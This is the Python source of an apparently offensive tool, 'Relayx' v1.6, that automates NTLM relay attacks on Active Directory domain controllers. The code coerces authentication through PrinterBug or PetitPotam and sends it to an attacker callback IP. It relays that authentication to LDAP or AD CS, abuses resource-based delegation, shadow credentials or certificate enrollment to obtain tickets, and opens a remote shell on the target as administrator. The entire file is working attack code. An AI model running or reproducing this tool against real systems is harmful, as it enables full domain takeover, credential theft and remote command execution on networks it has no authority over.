#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import ssl
import argparse
import logging
import sys
import time
import os
import config
import requests
import random
import string
from sys import version_info
from multiprocessing import Manager
from threading import Thread, Lock 
from comm import logger
from comm.ntlmrelayx.attacks import PROTOCOL_ATTACKS
from comm.ntlmrelayx.utils.config import NTLMRelayxConfig # add AD CS
from comm.ntlmrelayx.servers import SMBRelayServer
from comm.trigger.printer import PrinterBug
from comm.trigger.efs import CoerceAuth
from comm.ticket.getST import GETST
from comm.execute.smbexec import CMDEXEC
from impacket.examples import utils
from impacket import version
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from minikerberos.network.clientsocket import KerberosClientSocket
from minikerberos.common.target import KerberosTarget
from minikerberos.common.ccache import CCACHE


def banner():
	banner = R"""                              
  ██▀███  ▓█████  ██▓    ▄▄▄     ▓██   ██▓▒██   ██▒
 ▓██ ▒ ██▒▓█   ▀ ▓██▒   ▒████▄    ▒██  ██▒▒▒ █ █ ▒░
 ▓██ ░▄█ ▒▒███   ▒██░   ▒██  ▀█▄   ▒██ ██░░░  █   ░
 ▒██▀▀█▄  ▒▓█  ▄ ▒██░   ░██▄▄▄▄██  ░ ▐██▓░ ░ █ █ ▒ 
 ░██▓ ▒██▒░▒████▒░██████▒▓█   ▓██▒ ░ ██▒▓░▒██▒ ▒██▒
 ░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒ ▒▒ ░ ░▓ ░
   ░▒ ░ ▒░ ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░ ░░   ░▒ ░
   ░░   ░    ░     ░ ░    ░   ▒   ▒ ▒ ░░   ░    ░  
    ░        ░  ░    ░  ░     ░  ░░ ░      ░    ░  
                                  ░ ░  version: 1.6                                                                                       
"""
	print(banner)
	print("\n\033[1;33m\t\tNTLMrelay attack \033[0m")
	print("\tAuthor: evi1cg (https://twitter.com/evi1cg)\n")



def startServers(userDomain, userName, password, address, kdc, adcs, callback, options):
    global start
    start = time.time()
    logging.info("Current attack method is ==> {}".format(options.method.upper()))
    logging.info("Current trigger is  ==> {}".format(options.trigger.upper()))
    try:
        if not options.no_attack:
            target_dc = kdc
            c = NTLMRelayxConfig()
            c.setProtocolClients(PROTOCOL_CLIENTS)
            target_ldap = "ldap" if options.ldap else "ldaps"
            if options.method == "rbcd":
                c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
                c.addcomputer = options.add_computer
                c.dumplaps = False
                c.dumpgmsa = False
                c.sid = None
                c.delegateaccess = True
                c.escalateuser = userName
            elif options.method == "sdcd":
                c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
                c.addcomputer = options.add_computer
                c.dumplaps = False
                c.dumpgmsa = False
                c.sid = None
                c.shadowcredential = True
                c.delegateaccess = False
                c.kdc = kdc
                c.userDomain = userDomain
                c.aclattack = False
            else:
                if options.ssl:
                    target = "https://"+adcs+"/certsrv/certfnsh.asp"
                else:
                    target = "http://"+adcs+"/certsrv/certfnsh.asp"
                c.setTargets(TargetsProcessor(singleTarget=str(target), protocolClients=PROTOCOL_CLIENTS))
                c.setIsADCSAttack(kdc)
                c.setADCSOptions(options.template)
            c.setOutputFile(None)
            c.setEncoding('ascii')
            c.setMode('RELAY')
            c.setAttacks(PROTOCOL_ATTACKS)
            c.setLootdir('.')
            c.setInterfaceIp("0.0.0.0")
            c.setExploitOptions(True,False)
            c.setSMB2Support(True)
            c.setListeningPort(options.smb_port)
            s = SMBRelayServer(c)
            s.start()
            logging.info("Relay servers started, waiting for connection....")
    except Exception as e:
        logging.error("Error in starting servers: {}".format(e))
        sys.exit(1)
    try:
        if not options.no_trigger:
            status = exploit(userDomain, userName, password, address, callback, options)
        else:
            status = True
        if status and not options.no_attack:
            exp = Thread(target=checkauth, args=(userDomain, kdc, options,))
            exp.daemon = True
            exp.start()
            try:
                if version_info.major == 2:
                    PY2 = True
                else:
                    PY2 = False
                while exp.isAlive() if PY2 else exp.is_alive():
                    pass
            except KeyboardInterrupt as e:
                logging.info("Shutting down...")
        elif options.no_attack:
            logging.info("Done.")
        else:
            logging.error("Shutting down...")
    except Exception as e:
        logging.info("Shutting down..., error {}".format(e))
    finally:
        if not options.no_attack:
            s.server.shutdown()


def checkauth(userDomain, kdc, options):
    getpriv = config.get_priv()
    dcync = config.get_dcsync()
    pki = config.get_pki()
    while True:
        if getpriv == True:
            if dcync:
                break
            elif options.method == "rbcd":
                s4u2pwnage(userDomain, kdc, options)
                break
            elif options.method == "sdcd":
                break
        if pki == True:
            try:
                pki2TGT(userDomain, options)
            except Exception as e:
                logging.error("Requesting with PKINITtools error: {}, pls using rubeus instead !~".format(e))
            break
        getpriv = config.get_priv()
        dcync = config.get_dcsync()
        pki = config.get_pki()
        tmp = time.time() - start
        if tmp > options.timeout:
            logging.error("Time Out. exiting...")
            break


def s4u2pwnage(userDomain, kdc, options):
    logging.info("Executing s4u2pwnage..")
    new_username = config.get_newUser()
    new_password = config.get_newPassword()
    domain = userDomain
    targetName = config.get_targetName()
    if logging.getLogger().level == logging.DEBUG:
        options.debug = True
    options.targetName = targetName
    options.force_forwardable = True
    options.aesKey = None
    options.hashes = None
    thostname = '{}.{}'.format(targetName.replace("$", ""), domain)
    options.spn = 'cifs/{}'.format(thostname)
    try:
        executer = GETST(new_username, new_password, domain, options)
        executer.run()
        try:
            if options.shell:
                ccachefile = config.get_ccache()
                if os.path.exists(ccachefile):
                    logging.info('Loading ticket..')
                    os.environ['KRB5CCNAME'] = ccachefile
                else:
                    logger.info("No ticket find. exit..")
                    sys.exit(1)
                options.nooutput = False
                logging.info('Trying to open a shell.')
                if not options.service_name:
                    options.service_name = 'Microsoft Corporation'
                executer = CMDEXEC(options.impersonate, "", domain, options.hashes, options.aesKey, True, kdc,
                            options.mode, options.share, int(options.rpc_smb_port), options.service_name, options.shell_type, options.codec)
                executer.run(thostname, options.target_ip)
                #os.remove(ccachefile)
                logging.critical("Exit...")
            else:
                logging.critical('Execute shell is False, Exiting...')
        except KeyboardInterrupt as e:
            logging.error(str(e))
        except Exception as e:
            logging.error(str(e))
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            sys.exit(1)
    except Exception as e:
        logging.error(str(e))
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()

def pki2TGT(domain,options):
    from comm.ticket.gettgtpkinit import myPKINIT
    # Code from  https://github.com/dirkjanm/PKINITtools
    # Static DH params because the ones generated by cryptography are considered unsafe by AD for some weird reason
    dhparams = {
        'p':int('00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff', 16),
        'g':2
    }
    targetName = config.get_targetName().replace('$','')
    cert_pfx = config.get_pfx()
    password = config.get_pass()
    ini = myPKINIT.from_pfx(cert_pfx, password, dhparams)
    req = ini.build_asreq(domain,targetName)
    logging.info('Requesting TGT')
    sock = KerberosClientSocket(KerberosTarget(options.dc_ip))
    res = sock.sendrecv(req)

    encasrep, session_key, cipher = ini.decrypt_asrep(res.native)
    ccache = CCACHE()
    ccache.add_tgt(res.native, encasrep)
    cachefile = "{}{}.ccache".format(domain,targetName)
    ccache.to_file(cachefile)
    logging.critical('Saved TGT to file {}'.format(cachefile))


def exploit(userDomain, userName, password, address, callback, options):
    try:
        if options.trigger == "printer":
            lookup = PrinterBug(userName, password, userDomain, int(options.rpc_smb_port), options.hashes, callback)
            check = lookup.dump(address)
            if check:
                return True
        else:
            plop = CoerceAuth()
            if ":" in password:
                lmhash, nthash = password.split(':')
            else:
                lmhash = ''
                nthash = ''
            dce = plop.connect(username=userName, password=password, domain=userDomain, lmhash=lmhash, nthash=nthash, target=address, pipe=options.pipe)
            status = plop.EfsRpcOpenFileRaw(dce, callback)
            if status:
                return True
            dce.disconnect()
            if status:
                return True
        return False
    except KeyboardInterrupt:
        return False
    except Exception as e:
        return False

def check_adcs(url,options):
    if options.ssl:
        target_url = "https://{}/certsrv/certfnsh.asp".format(url)
    else:
        target_url = "http://{}/certsrv/certfnsh.asp".format(url)
    try:
        resp = requests.get(target_url, verify=False, timeout=options.timeout)
        if resp.status_code == 401:
            return True
    except Exception as e:
        logging.error("AD CS not found! Pls set up ADCS IP.")
    return False
    

def get_args():
    parser = argparse.ArgumentParser(add_help=True,description='DCpwn with ntlmrelay')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')

    parser.add_argument("-r","--callback-ip", required=True, help="Attacker callback IP")
    parser.add_argument("--timeout", default='120',type=int, help='timeout in seconds')
    parser.add_argument("--debug", action='store_true',help='Enable debug output')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('--no-trigger', action='store_true', help='Start exploit server without trigger.')
    parser.add_argument('--no-attack', action='store_true', help='Start trigger for test.')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for account auth (instead of password)')

    
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP address of the Domain Controller')
    group.add_argument('-adcs-ip', action='store', metavar="ip address",
                       help='IP Address of the ADCS, if unspecified, dc ip will be used')
    group.add_argument("--ldap", action='store_true', help='Use ldap.')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    parser.add_argument('--smb-port', type=int, help='Port to listen on smb server', default=445)
    parser.add_argument('-rpc-smb-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                  help='Destination port to connect to SMB Server')
    

    group = parser.add_argument_group('attack')
    group.add_argument('-m',"--method" , action="store", choices=['rbcd','pki','sdcd'], default="rbcd",help='Set up attack method, rbcd or pki or sdcd (shadow credential)')
    group.add_argument('-t',"--trigger" ,action="store", choices=['printer','efs'], default="printer", help='Set up trigger method, printer or petitpotam')
    group.add_argument('--impersonate', action="store",  default='administrator', help='target username that will be impersonated (thru S4U2Self)'
                                                              ' for quering the ST. Keep in mind this will only work if '
                                                              'the identity provided in this scripts is allowed for '
                                                              'delegation to the SPN specified')
    group.add_argument('--add-computer', action='store', metavar='COMPUTERNAME', required=False, const='Rand', nargs='?', help='Attempt to add a new computer account')
    group.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass'], default='lsarpc', help='Named pipe to use (default: lsarpc)')
    group.add_argument('--template', action='store', metavar="TEMPLATE", required=False, default="Machine", help='AD CS template. If you are attacking Domain Controller or other windows server machine, default value should be suitable.')
    group.add_argument('-pp',"--pfx-pass", action="store", required=False, default='Rand', help='PFX password.')
    group.add_argument('-ssl', action='store_true', help='This is useful when AD CS use ssl.')


    group = parser.add_argument_group('execute')
    group.add_argument('-shell', action='store_true', help='Launch semi-interactive shell, Default is False')
    group.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$)')
    group.add_argument('-shell-type', action='store', default = 'cmd', choices = ['cmd', 'powershell'], help='choose '
                        'a command processor for the semi-interactive shell')
    group.add_argument('-codec', action='store', default='GBK', help='Sets encoding used (codec) from the target\'s output (default "GBK").')
    group.add_argument('-service-name', action='store', metavar="service_name", help='The name of the'
                                         'service used to trigger the payload')
    group.add_argument('-mode', action='store', choices = {'SERVER','SHARE'}, default='SHARE',
                        help='mode to use (default SHARE, SERVER needs root!)')
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    return parser

def main():
    banner()
    options = get_args().parse_args()
    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    userDomain, userName, password, address = utils.parse_target(options.target)

    if userDomain == '':
        logging.critical('userDomain should be specified!')
        sys.exit(1)

    if options.no_trigger:
        options.trigger = "no trigger"
    if options.no_attack:
        options.method = "no attack"

    if options.target_ip is None:
        options.target_ip = address

    if options.dc_ip:
        kdc = options.dc_ip
    else:
        logging.info("If your target is not DC, pls set up dc-ip.")
        kdc = address

    if options.adcs_ip:
        adcs = options.adcs_ip
    else:
        adcs = kdc

    if password == '' and userName != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")
       
    if options.hashes:
        password = ("aad3b435b51404eeaad3b435b51404ee:" + options.hashes.split(":")[1]).upper()
    
    callback = options.callback_ip
    if options.method == "pki":
        ads = check_adcs(adcs,options)
        if not ads:
            sys.exit(0)
        if options.pfx_pass == "Rand":
            setpass = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        else:
            setpass = options.pfx_pass
        config.set_pass(setpass)
    startServers(userDomain, userName, password, address, kdc, adcs, callback, options)

if __name__ == '__main__':
    main()
